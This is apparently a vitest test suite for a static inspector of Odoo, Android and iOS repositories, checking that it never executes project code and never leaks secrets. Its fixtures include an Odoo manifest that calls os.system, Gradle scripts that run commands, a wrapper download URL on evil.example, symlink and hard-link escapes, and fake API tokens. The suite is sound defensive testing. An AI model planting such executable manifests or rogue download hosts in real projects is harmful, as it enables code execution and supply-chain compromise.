import { afterEach, describe, expect, it } from 'vitest'
import { spawnSync } from 'node:child_process'
import { chmodSync, existsSync, linkSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { tmpdir } from 'node:os'
import { defaultDevelopmentSettings, DevelopmentInspectResultSchema, type DevelopmentSettings } from '@hapi/protocol/evolvedDevelopment'
import { inspectRepository, odooVersionAccepted } from './inspect'
import { inspectXml } from './staticChecks'
import { SafeTree } from './safeTree'

const directories: string[] = []
afterEach(() => { for (const path of directories.splice(0)) rmSync(path, { recursive: true, force: true }) })
function temp() { const path = realpathSync(mkdtempSync(join(tmpdir(), 'evolved-inspect-'))); directories.push(path); return path }
function write(root: string, path: string, content: string | Buffer) { mkdirSync(dirname(join(root, path)), { recursive: true }); writeFileSync(join(root, path), content) }
function odooSettings(major: 19 | 20, addonsPaths = ['.'], modules: string[] = []): DevelopmentSettings {
    const settings = defaultDevelopmentSettings('odoo')
    settings.odoo!.major = major
    settings.odoo!.addonsPaths = addonsPaths
    settings.odoo!.modules = modules
    return settings
}
const SHA = 'a'.repeat(40)
function git(root: string) {
    write(root, '.git/HEAD', 'ref: refs/heads/main\n')
    write(root, '.git/refs/heads/main', `${SHA}\n`)
}

describe('static Odoo module inspection', () => {
    it('inventories manifests, dependencies, security and data files without executing anything', async () => {
        const root = temp(), outside = temp(), marker = join(outside, 'executed')
        git(root)
        write(root, 'addons/sale_ext/__manifest__.py', `{
    'name': 'Sale Extension', 'version': '20.0.1.0.0', 'license': 'LGPL-3',
    'depends': ['sale', 'stock_ext'], 'data': ['security/ir.model.access.csv', 'security/groups.xml', 'views/views.xml', 'data/missing.xml', '../../escape.xml'],
    'demo': ['demo/demo.xml'], 'assets': {'web.assets_backend': ['sale_ext/static/src/**/*']},
    'external_dependencies': {'python': ['requests']}, 'application': True,
}`)
        write(root, 'addons/sale_ext/__init__.py', 'from . import models\n')
        write(root, 'addons/sale_ext/models/__init__.py', `open(${JSON.stringify(marker)}, 'w').write('x')\nAPI_KEY = "sk-${'s'.repeat(30)}"\n`)
        write(root, 'addons/sale_ext/tests/test_sale.py', 'def test(): pass\n')
        write(root, 'addons/sale_ext/security/ir.model.access.csv', 'id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink\naccess_a,a,model_a,base.group_user,1,1,1,0\naccess_b,b,model_b,,1,0,0,0\n')
        write(root, 'addons/sale_ext/security/groups.xml', '<?xml version="1.0"?>\n<odoo><record id="g" model="res.groups"><field name="name">G</field></record></odoo>\n')
        write(root, 'addons/sale_ext/views/views.xml', '<odoo><record id="v"><field name="arch" type="xml"><form/></field></odoo>')
        write(root, 'addons/sale_ext/static/src/app.js', 'export {}\n')
        write(root, 'addons/sale_ext/demo/demo.xml', '<odoo/>')
        write(root, 'addons/sale_ext/migrations/20.0.1.0.1/pre-migrate.py', 'def migrate(cr, v): pass\n')
        // Executable manifest: must be reported invalid, never run.
        write(root, 'addons/evil/__manifest__.py', `__import__('os').system('touch ${marker}') or {'name': 'Evil'}`)
        // Manifest version for the wrong major.
        write(root, 'addons/stock_ext/__manifest__.py', `{'name': 'Stock', 'version': '19.0.1.0.0', 'depends': ['stock'], 'installable': False}`)
        write(root, 'addons/legacy/__openerp__.py', `{'name': 'Legacy'}`)
        write(root, 'addons/requirements.txt', '# deps\nrequests==2.32.3\n')

        const result = await inspectRepository({ checkout: root, repositoryId: '42', mode: 'odoo', settings: odooSettings(20, ['addons'], ['sale_ext', 'absent_module']) })
        expect(DevelopmentInspectResultSchema.parse(result)).toEqual(result)
        expect(existsSync(marker)).toBe(false)
        expect(result).toMatchObject({ state: 'ready', head: SHA, branch: 'main', repositoryId: '42' })
        const byName = Object.fromEntries(result.odooModules.map(module => [module.technicalName, module]))
        expect(Object.keys(byName).sort()).toEqual(['evil', 'sale_ext', 'stock_ext'])
        expect(byName.sale_ext).toMatchObject({
            manifest: 'valid', name: 'Sale Extension', version: '20.0.1.0.0', versionMatchesMajor: true, license: 'LGPL-3', installable: true, application: true, autoInstall: false,
            depends: ['sale', 'stock_ext'], externalPython: ['requests'], assetsBundles: ['web.assets_backend'], demo: ['demo/demo.xml'],
            missingDataFiles: ['data/missing.xml'], security: { accessCsv: true, accessRules: 2, securityXmlFiles: 1 }, hasMigrations: true,
        })
        expect(byName.sale_ext.data).not.toContain('../../escape.xml')
        expect(byName.sale_ext.counts).toMatchObject({ python: 5, xml: 3, csv: 1, js: 1, tests: 1 })
        expect(byName.sale_ext.issues.join('\n')).toMatch(/views\/views.xml: XML nicht wohlgeformt/)
        expect(byName.sale_ext.issues.join('\n')).toMatch(/unsicherer Pfad/)
        expect(byName.evil).toMatchObject({ manifest: 'invalid', name: null, depends: [] })
        expect(byName.evil.issues[0]).toMatch(/kein reines Python-Literal/)
        expect(byName.stock_ext).toMatchObject({ versionMatchesMajor: false, installable: false })
        expect(result.warnings.join('\n')).toMatch(/legacy hat nur __openerp__.py/)
        expect(result.warnings.join('\n')).toMatch(/absent_module wurde in den Addons-Pfaden nicht gefunden/)
        expect(result.warnings.join('\n')).toMatch(/ohne Odoo-Quellen im Projekt nicht prüfbar/)
        expect(result.buildFiles).toContainEqual({ path: 'addons/requirements.txt', kind: 'odoo_requirements', facts: { requirements: '1' } })
        // No raw source: neither Python content nor the credential-like constant is returned.
        const serialized = JSON.stringify(result)
        expect(serialized).not.toContain('sk-sss')
        expect(serialized).not.toContain('__import__')
        expect(serialized).not.toContain(marker)
    })

    it('refuses symlinks, FIFOs, hard links and oversized manifests', async () => {
        const root = temp(), outside = temp()
        write(outside, 'secret/__manifest__.py', `{'name': 'Outside'}`)
        write(outside, 'passwd.xml', '<odoo/>')
        write(root, 'linked_manifest/__init__.py', '')
        symlinkSync(join(outside, 'secret/__manifest__.py'), join(root, 'linked_manifest/__manifest__.py'))
        symlinkSync(join(outside, 'secret'), join(root, 'linked_module'))
        write(root, 'hardlinked/__init__.py', '')
        linkSync(join(outside, 'secret/__manifest__.py'), join(root, 'hardlinked/__manifest__.py'))
        write(root, 'huge/__manifest__.py', `{'name': '${'x'.repeat(300 * 1024)}'}`)
        write(root, 'mod/__manifest__.py', `{'name': 'Mod', 'version': '1.0', 'data': ['link.xml', 'pipe.xml', 'dir.xml']}`)
        symlinkSync(join(outside, 'passwd.xml'), join(root, 'mod/link.xml'))
        mkdirSync(join(root, 'mod/dir.xml'))
        const fifo = spawnSync('mkfifo', [join(root, 'mod/pipe.xml')]).status === 0
        const started = Date.now()
        const result = await inspectRepository({ checkout: root, repositoryId: '7', mode: 'odoo', settings: odooSettings(19) })
        expect(Date.now() - started).toBeLessThan(5000)
        DevelopmentInspectResultSchema.parse(result)
        const byName = Object.fromEntries(result.odooModules.map(module => [module.technicalName, module]))
        expect(byName.linked_module).toBeUndefined()
        expect(result.warnings.join('\n')).toMatch(/linked_module ist eine symbolische Verknüpfung/)
        expect(byName.linked_manifest.manifest).toBe('unsafe')
        expect(byName.hardlinked.manifest).toBe('unsafe')
        expect(byName.hardlinked.issues[0]).toMatch(/harte Verknüpfungen/)
        expect(byName.huge.manifest).toBe('unsafe')
        expect(byName.mod.versionMatchesMajor).toBe(true)
        expect(byName.mod.issues.join('\n')).toMatch(/Kurze Versionsangabe/)
        expect(byName.mod.issues.join('\n')).toMatch(/link.xml ist eine symbolische Verknüpfung/)
        expect(byName.mod.issues.join('\n')).toMatch(/dir.xml ist keine reguläre Datei/)
        if (fifo) expect(byName.mod.issues.join('\n')).toMatch(/pipe.xml ist keine reguläre Datei/)
        expect(JSON.stringify(result)).not.toContain('Outside')
    })

    it('reports missing or unsafe checkouts honestly instead of scanning elsewhere', async () => {
        const parent = temp(), outside = temp()
        expect(await inspectRepository({ checkout: join(parent, 'absent'), repositoryId: '1', mode: 'odoo', settings: odooSettings(19) })).toMatchObject({ state: 'missing', odooModules: [] })
        symlinkSync(outside, join(parent, 'link'))
        expect(await inspectRepository({ checkout: join(parent, 'link'), repositoryId: '1', mode: 'odoo', settings: odooSettings(19) })).toMatchObject({ state: 'blocked', odooModules: [] })
        expect(await inspectRepository({ checkout: `${parent}/../${parent.split('/').pop()}`, repositoryId: '1', mode: 'odoo', settings: odooSettings(19) })).toMatchObject({ state: 'blocked' })
    })

    it('resolves core dependencies against a project-owned Odoo source when present', async () => {
        const root = temp(), source = temp()
        write(root, 'my_mod/__manifest__.py', `{'name': 'M', 'version': '19.0.1.0.0', 'license': 'LGPL-3', 'depends': ['base', 'sale', 'web_enterprise']}`)
        write(source, 'odoo/addons/base/__manifest__.py', '{}')
        write(source, 'addons/sale/__manifest__.py', '{}')
        const result = await inspectRepository({ checkout: root, repositoryId: '1', mode: 'odoo', settings: odooSettings(19), odooSourceDirectory: source })
        expect(result.warnings.join('\n')).toMatch(/weder im Repository noch in den Odoo-Community-Quellen gefunden: web_enterprise/)
        expect(result.warnings.join('\n')).not.toMatch(/\bsale\b.*nicht gefunden/)
    })

    it('checks the Odoo 20 ir.access format and flags access files of the other series', async () => {
        const root = temp()
        write(root, 'm20/__manifest__.py', `{'name': 'M', 'version': '20.0.1.0.0', 'license': 'LGPL-3', 'data': ['security/ir.access.csv']}`)
        write(root, 'm20/security/ir.access.csv', 'id,name,model_id,group_id/id,operation,domain\naccess_a,a,res.partner,base.group_user,cru,\naccess_b,b,res.partner,,write,\n')
        write(root, 'legacy/__manifest__.py', `{'name': 'L', 'version': '20.0.1.0.0', 'license': 'LGPL-3', 'data': ['security/ir.model.access.csv']}`)
        write(root, 'legacy/security/ir.model.access.csv', 'id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink\na,a,model_res_partner,,1,0,0,0\n')
        const twenty = await inspectRepository({ checkout: root, repositoryId: '1', mode: 'odoo', settings: odooSettings(20) })
        const byName = Object.fromEntries(twenty.odooModules.map(module => [module.technicalName, module]))
        expect(byName.m20.security).toEqual({ accessCsv: true, accessRules: 2, securityXmlFiles: 0 })
        expect(byName.m20.issues.join('\n')).toMatch(/unbekannte operation-Werte/)
        expect(byName.legacy.issues.join('\n')).toMatch(/Odoo 20 hat kein Modell ir.model.access mehr/)
        const nineteen = await inspectRepository({ checkout: root, repositoryId: '1', mode: 'odoo', settings: odooSettings(19) })
        expect(nineteen.odooModules.find(module => module.technicalName === 'm20')!.issues.join('\n')).toMatch(/ir.access gibt es erst ab Odoo 20/)
        expect(nineteen.odooModules.find(module => module.technicalName === 'legacy')!.issues.join('\n')).not.toMatch(/ir.model.access mehr/)
    })

    it('bounds output: issues, data lists and module count stay within the contract', async () => {
        const root = temp()
        const data = Array.from({ length: 700 }, (_, index) => `data/f${index}.xml`)
        write(root, 'big/__manifest__.py', `{'name': 'Big', 'version': '19.0.1.0.0', 'license': 'LGPL-3', 'data': ${JSON.stringify(data)}}`)
        const result = await inspectRepository({ checkout: root, repositoryId: '1', mode: 'odoo', settings: odooSettings(19) })
        DevelopmentInspectResultSchema.parse(result)
        expect(result.odooModules[0].data).toHaveLength(500)
        expect(result.odooModules[0].missingDataFiles.length).toBeLessThanOrEqual(100)
        expect(result.odooModules[0].issues.length).toBeLessThanOrEqual(50)
    })
})

describe('Odoo version, XML and redaction rules', () => {
    it('matches odoo/modules/module.py adapt_version + check_version of 19.0 and 20.0', () => {
        const cases: Array<[string, 19 | 20, boolean]> = [
            ['19.0.1.0', 20, false], ['20.0.1.0', 20, true], ['1', 20, false], ['20.0.1.2.3.4', 20, false], ['20.0', 20, false],
            ['1.0', 20, true], ['1.0.0', 20, true], ['1.0.0.0', 20, false], ['20.0.1.0.0', 20, true], ['19.0.1.0.0', 19, true], ['19.0.1.0.0', 20, false],
            ['a.b', 20, false], ['1..0', 19, false], ['1.0', 19, true],
        ]
        for (const [version, major, accepted] of cases) expect([version, major, odooVersionAccepted(version, major)]).toEqual([version, major, accepted])
    })

    it('reports undeclared entities, bare ampersands, invalid comments and character references as not well-formed', () => {
        for (const source of ['<odoo>&missing;</odoo>', '<odoo><record name="a & b"/></odoo>', '<odoo><!-- invalid -- comment --></odoo>', '<odoo>&#0;</odoo>', '<odoo>a]]>b</odoo>', '<odoo>\u0001</odoo>']) {
            expect(inspectXml(source).wellFormed).toBe(false)
        }
        expect(inspectXml('<?xml version="1.0"?>\n<odoo><récord a="&amp;&#x41;">ü</récord></odoo>').wellFormed).toBe(true)
        expect(inspectXml('<!DOCTYPE x [<!ENTITY e "v">]><x>&e;</x>')).toMatchObject({ wellFormed: null, doctype: true })
    })

    it('withholds credential-looking values in every manifest list field', async () => {
        const root = temp(), marker = 'ghp_' + 'SYNTHETICNOTAREALTOKEN0000000000'
        write(root, 'm/__manifest__.py', `{'name': 'M', 'version': '19.0.1.0.0', 'license': 'LGPL-3', 'depends': ['base', '${marker}'], 'external_dependencies': {'python': ['${marker}']}, 'assets': {'${marker}': []}, 'data': ['${marker}.xml']}`)
        const result = await inspectRepository({ checkout: root, repositoryId: '1', mode: 'odoo', settings: odooSettings(19) })
        expect(JSON.stringify(result)).not.toContain(marker)
        expect(result.odooModules[0].depends).toEqual(['base'])
        expect(result.odooModules[0].issues.join('\n')).toMatch(/sehen wie Zugangsdaten aus/)
    })

    it('reads directories incrementally and marks truncation instead of enumerating everything', async () => {
        const root = temp()
        for (let index = 0; index < 50; index++) mkdirSync(join(root, `dir${index}`))
        const tree = await SafeTree.open(root, { reads: 10, bytes: 1024, entries: 20 })
        if (typeof tree === 'string') throw new Error(tree)
        const listing = await tree.list('', 2000)
        if (typeof listing === 'string') throw new Error(listing)
        expect(listing.entries).toHaveLength(20)
        expect(listing.truncated).toBe(true)
        expect(tree.exhausted).toBe(true)
        const expired = await SafeTree.open(root, { reads: 10, bytes: 1024, entries: 100, deadline: Date.now() - 1 })
        if (typeof expired === 'string') throw new Error(expired)
        expect(await expired.list('')).toBe('unavailable')
        expect(expired.timedOut).toBe(true)
    })
})

describe('static Android and iOS inspection', () => {
    it('reads Gradle facts statically and never runs the wrapper or build scripts', async () => {
        const root = temp(), marker = join(root, 'wrapper-ran')
        write(root, 'android/settings.gradle.kts', 'rootProject.name = "Demo"\ninclude(":app")\ninclude(":feature:login")\n')
        write(root, 'android/gradlew', `#!/bin/sh\ntouch ${marker}\n`)
        chmodSync(join(root, 'android/gradlew'), 0o755)
        write(root, 'android/gradle/wrapper/gradle-wrapper.properties', 'distributionUrl=https\\://evil.example/gradle-8.9-bin.zip\n')
        write(root, 'android/gradle/libs.versions.toml', '[versions]\nagp = "8.7.2"\nkotlin = "2.1.0"\n')
        write(root, 'android/app/build.gradle.kts', `plugins { id("com.android.application") }\nandroid {\n namespace = "com.example.demo"\n compileSdk = 35\n defaultConfig { applicationId = "com.example.demo"\n minSdk = 26\n targetSdk = 35 }\n}\nkotlin { jvmToolchain(17) }\nexec { commandLine("touch", "${marker}") }\n`)
        write(root, 'android/app/src/main/AndroidManifest.xml', '<manifest xmlns:android="http://schemas.android.com/apk/res/android"><application/></manifest>')
        write(root, '.github/workflows/android.yml', 'name: Android CI\njobs:\n  build:\n    runs-on: ubuntu-latest\n')
        const settings = defaultDevelopmentSettings('android')
        settings.android!.projectDirectory = 'android'
        settings.android!.applicationId = 'com.example.other'
        const result = await inspectRepository({ checkout: root, repositoryId: '3', mode: 'android', settings })
        DevelopmentInspectResultSchema.parse(result)
        expect(existsSync(marker)).toBe(false)
        expect(result.buildFiles).toContainEqual({ path: 'android/app/build.gradle.kts', kind: 'gradle_build', facts: { namespace: 'com.example.demo', applicationId: 'com.example.demo', compileSdk: '35', minSdk: '26', targetSdk: '35', jvmToolchain: '17' } })
        expect(result.buildFiles).toContainEqual({ path: 'android/gradle/wrapper/gradle-wrapper.properties', kind: 'gradle_wrapper', facts: { gradleVersion: '8.9', distributionHost: 'unbekannt', checksumPinned: 'no' } })
        expect(result.buildFiles).toContainEqual({ path: 'android/gradle/libs.versions.toml', kind: 'version_catalog', facts: { agp: '8.7.2', kotlin: '2.1.0' } })
        expect(result.buildFiles).toContainEqual({ path: 'android/settings.gradle.kts', kind: 'gradle_settings', facts: { includes: '2', rootProjectName: 'Demo' } })
        expect(result.buildFiles).toContainEqual({ path: '.github/workflows/android.yml', kind: 'ci_workflow', facts: { name: 'Android CI', runsOn: 'ubuntu-latest' } })
        expect(result.warnings.join('\n')).toMatch(/nicht von https:\/\/services\.gradle\.org/)
        expect(result.warnings.join('\n')).toMatch(/applicationId im Build \(com.example.demo\) weicht/)
    })

    it('marks UIKit/SwiftUI targets as not Linux-testable and reads Xcode metadata', async () => {
        const root = temp()
        write(root, 'Package.swift', '// swift-tools-version: 6.0\nimport PackageDescription\nlet package = Package(name: "Demo", platforms: [.iOS(.v17), .macOS(.v14)], targets: [])\n')
        write(root, 'Sources/Core/Model.swift', 'import Foundation\nstruct Model {}\n')
        write(root, 'Sources/AppUI/View.swift', 'import SwiftUI\nstruct V: View { var body: some View { Text("x") } }\n')
        write(root, 'Tests/CoreTests/ModelTests.swift', 'import Testing\n@testable import Core\n')
        write(root, 'App.xcodeproj/project.pbxproj', 'isa = PBXNativeTarget;\nIPHONEOS_DEPLOYMENT_TARGET = 17.0;\nPRODUCT_BUNDLE_IDENTIFIER = com.example.app;\nSWIFT_VERSION = 6.0;\n')
        write(root, 'App.xcodeproj/xcshareddata/xcschemes/App.xcscheme', '<Scheme/>')
        write(root, 'App/PrivacyInfo.xcprivacy', '<plist/>')
        const settings = defaultDevelopmentSettings('ios')
        settings.ios!.scheme = 'AppTests'
        const result = await inspectRepository({ checkout: root, repositoryId: '9', mode: 'ios', settings })
        DevelopmentInspectResultSchema.parse(result)
        expect(result.buildFiles).toContainEqual({ path: 'Package.swift', kind: 'swiftpm', facts: { toolsVersion: '6.0', platforms: 'iOS 17, macOS 14', appleOnlyTargets: 'AppUI', linuxCandidateTargets: 'Core, CoreTests' } })
        expect(result.buildFiles).toContainEqual({ path: 'App.xcodeproj', kind: 'xcodeproj', facts: { iphoneosDeploymentTarget: '17.0', productBundleIdentifier: 'com.example.app', swiftVersion: '6.0', nativeTargets: '1' } })
        expect(result.buildFiles).toContainEqual({ path: 'App/PrivacyInfo.xcprivacy', kind: 'privacy_manifest' })
        expect(result.warnings.join('\n')).toMatch(/unter Linux nicht baubar oder testbar: AppUI/)
        expect(result.warnings.join('\n')).toMatch(/Scheme AppTests ist nicht als geteiltes Scheme/)
    })
})
